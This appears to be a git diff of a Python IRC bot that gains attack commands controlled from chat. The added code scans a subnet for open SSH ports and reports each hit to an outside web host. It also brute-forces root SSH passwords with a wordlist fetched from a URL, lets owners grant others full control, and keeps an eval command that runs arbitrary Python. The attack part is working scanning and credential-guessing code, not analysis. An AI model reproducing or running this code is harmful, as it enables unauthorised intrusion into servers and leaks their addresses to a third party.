@@ -8,13 +8,14 @@ from connection import Connection
 from threading import Thread
 
 from lolclean.lolclean import LOLClean
+import paramiko
 
 class Bot:
 	END_OF_MOTDS = ['376', '422']
 	PREFIX = 'v'
 	TAG = '(vayne)'
 
-	OWNERS = ['vayne']
+	OWNERS = ['segfault']
 
 	def __init__(self, nick):
 		self.__connections = []
@@ -71,22 +72,22 @@ class Bot:
 		if args[0] in self.END_OF_MOTDS:
 			for channel in self.__channels:
 				self.currcon.write(('JOIN', channel))
-			return	
+			return
 
 		if text:
-			if text[0] == self.PREFIX and len(text.split(' ')) >= 2:
-				self.parse_cmd(text, source)
+			if (text[0] == self.PREFIX or text.split(' ')[0] == self.__nick) and len(text.split(' ')) >= 2:
+				self.parse_cmd(text, source, args[1] if args[1][0] == '#' else source.split('!')[0])
 
-	def check_args(self, args, req):
+	def check_args(self, args, req, place):
 		if len(args) < req:
-			self.printayne('?', self.__channels)
+			self.printayne('?', [place])
 			return False
 		return True
 
-	def check_owner(self, source):
+	def check_owner(self, source, place):
 		if source in self.OWNERS:
 			return True
-		self.printayne('who the fuck are you?', self.__channels)
+		self.printayne('who the fuck are you?', [place])
 		return False
 
 	def add_jobs(self, key, jobs):
@@ -95,32 +96,58 @@ class Bot:
 		for job in jobs:
 			self.__threads[key].append(job)
 
+	def pop_job(self, key):
+		if len(self.__threads[key]) > 1:
+			self.__threads[key].pop()
+		else:
+			self.__threads.pop(key, None)
+
+	def job_running(self, key):
+		if key not in self.__threads:
+			return False
+		return True
+
 	def lolit(self):
 		return LeagueOfLegends(self.RIOT_API_KEY)
 
-	def parse_cmd(self, cmd, source):
-		args = cmd[2:].split(' ')
-		if len(args) > 1:
-			cmd, args = cmd[2:].split(' ', 1)
-		else:
-			cmd = args[0]
-			args = ''
-		args = args.split(' ')
+	def parse_cmd(self, cmd, source, place):
+		args = cmd.split(' ') 
+		#pop to remove the prefix
+		args.pop(0)
+
+		if len(args) < 1:
+			return
+
+		cmd = args.pop(0)
 		source = source.split('!')[0]
+		print cmd
+		print args
+
+		if (cmd == 'power'):
+			if not self.check_owner(source, place):
+				return
+			if not self.check_args(args, 1, place):
+				return
+
+			self.OWNERS.append(args[0])
+			self.printayne('now {0} has full power'.format(args[0]), place)
 
 		if (cmd == 'nick'):
-			if not self.check_owner(source):
+			if not self.check_owner(source, place):
 				return
-			if not self.check_args(args, 1):
+			if not self.check_args(args, 1, place):
 				return
 
+			self.__nick = args[0]
 			self.currcon.write(('NICK', args[0]))
+
 		if (cmd == 'join'):
-			if not self.check_owner(source):
+			if not self.check_owner(source, place):
 				return
-			if not self.check_args(args, 1):
+			if not self.check_args(args, 1, place):
 				return
 			self.currcon.write(('JOIN', args[0]))
+			self.__channels.append(args[0])
 
 		if (cmd == 'jobs'):
 			ct = 0
@@ -129,41 +156,63 @@ class Bot:
 				l = len(v)
 				ct += l
 				jobs += '{0}[{1}] '.format(k, l)
-			self.printayne('currently running {0} jobs => {1}'.format(ct, jobs), self.__channels)
+			self.printayne('currently running {0} jobs => {1}'.format(ct, jobs), [place])
 
 		if (cmd == 'stop'):
-			if not self.check_args(args, 1):
+			if not self.check_args(args, 1, place):
 				return
 			if args[0] == 'all':
 				self.__threads.clear()
 				return
 			if args[0] in self.__threads:
-				del self.__threads[args[0]][:]
+				self.__threads.pop(args[0], None)
 
 		if (cmd == 'py'):
-			if not self.check_owner(source):
+			if not self.check_owner(source, place):
 				return
-			if not self.check_args(args, 1):
+			if not self.check_args(args, 1, place):
 				return
 			try:
 				ret = eval(' '.join(args))
-				self.printayne(ret, self.__channels)
+				self.printayne(ret, [place])
 			except Exception as e:
-				self.printayne(e, self.__channels)
+				self.printayne(e, [place])
 
 		if (cmd == 'proxy'):
-			if not self.check_owner(source):
+			if not self.check_owner(source, place):
 				return
-			if not self.check_args(args, 1):
+			if not self.check_args(args, 1, place):
 				return
 
-			t = Thread(target=self.proxy, args=(args[0],))
+			t = Thread(target=self.proxy, args=(args[0], place,))
 			self.add_jobs('proxy', [t])
 			t.start()
-			self.printayne('checking for proxies in {0}'.format(args[0]), self.__channels)
+			self.printayne('checking for proxies in {0}'.format(args[0]), [place])
+
+		if (cmd == 'ssh'):
+			if not self.check_owner(source, place):
+				return
+			if not self.check_args(args, 1, place):
+				return
+
+			t = Thread(target=self.ssh, args=(args[0], place,))
+			self.add_jobs('ssh', [t])
+			t.start()
+			self.printayne('scanning for ssh in subnet {0}'.format(args[0]), [place])
+
+		if (cmd == 'bssh'):
+			if not self.check_owner(source, place):
+				return
+			if not self.check_args(args, 2, place):
+				return
+
+			t = Thread(target=self.bssh, args=(args[0], args[1], place,))
+			self.add_jobs('bssh', [t])
+			t.start()
+			self.printayne('bruteforcing ssh {0}'.format(args[0]), [place])
 
 		if (cmd == 'summoner'):
-			if not self.check_args(args, 2):
+			if not self.check_args(args, 2, place):
 				return
 
 			lol = self.lolit()
@@ -175,25 +224,25 @@ class Bot:
 				s_data = data[s_name]
 				s_id = s_data['id']
 				s_level = s_data['summonerLevel']
-				self.printayne('{0} => id {1} # level {2}'.format(s_name, s_id, s_level), self.__channels)
+				self.printayne('{0} => id {1} # level {2}'.format(s_name, s_id, s_level), [place])
 			except RiotError, e:
-				self.printayne('riot error => {0}'.format(e.error_msg), self.__channels)
+				self.printayne('riot error => {0}'.format(e.error_msg), [place])
 
 		if (cmd == 'rank'):
-			if not self.check_args(args, 2):
+			if not self.check_args(args, 2, place):
 				return
 			fine, output = self.__lol.rank(args[0], args[1])
 			if fine:
 				for line in output:
-					self.printayne(line, self.__channels)
+					self.printayne(line, [place])
 			else:
-				self.printayne(output, self.__channels)
+				self.printayne(output, [place])
 
 		if (cmd == 'last'):
-			if not self.check_args(args, 2):
+			if not self.check_args(args, 2, place):
 				return
 			fine, output = self.__lol.last(args[0], args[1])
-			self.printayne(output, self.__channels)
+			self.printayne(output, [place])
 
 	def is_bad_proxy(self, pip):
 		try:
@@ -209,17 +258,64 @@ class Bot:
 			return True
 		return False
 
-	def proxy(self, url):
+	def proxy(self, url, place):
 		socket.setdefaulttimeout(5)
 		try:
 			web_file = urllib2.urlopen(url)
 			for p in web_file:
+				if not self.job_running('proxy'):
+					return
 				if not self.is_bad_proxy(p.strip('\n')):
-					self.printayne('proxy {0} ONLINE'.format(p), self.__channels)
+					self.printayne('proxy {0} ONLINE'.format(p), [place])
+
 		except Exception, e:
-			self.printayne(e, self.__channels)
-			self.printayne('error downloading your proxy list file', self.__channels)
+			self.printayne(e, [place])
+			self.printayne('error downloading your proxy list file', [place])
 			return
+
+	def ssh_u(self, target):
+		try:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.settimeout(3)
+			sock.connect((target, 22))
+			return True
+		except Exception, e:
+			return False
+
+	def ssh(self, net, place):
+		for i in xrange(1, 256):
+			if not self.job_running('ssh'):
+				return
+			target = '{0}.{1}'.format(net, i)
+			if self.ssh_u(target):
+				urllib2.urlopen('{0}{1}'.format('http://www.huelol.com/ssh/check/', target))
+				self.printayne('ssh {0}'.format(target), [place])
+		self.pop_job('ssh')
+
+	def bssh_u(self, ssh, target, key):
+		try:
+			ssh.connect(target, username='root', password=key)
+			return True
+		except Exception, e:
+			return False
+
+	def bssh(self, target, url, place):
+		try:
+			web_file = urllib2.urlopen(url)
+			ssh = paramiko.SSHClient()
+			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			for p in web_file.readlines():
+				print p
+				if not self.job_running('bssh'):
+					return
+				if self.bssh_u(ssh, target, p.strip('\r\n')):
+					self.printayne('ssh {0} KEY {1} ACCEPTED'.format(target, p), [place])
+				else:
+					self.printayne('ssh {0} KEY {1} failed'.format(target, p), [place])
+			self.pop_job('bssh')
+		except Exception, e:
+			self.printayne(e, [place])
+			self.printayne('error downloading wordlist file', [place])
 
 	def work(self):
 		while True:
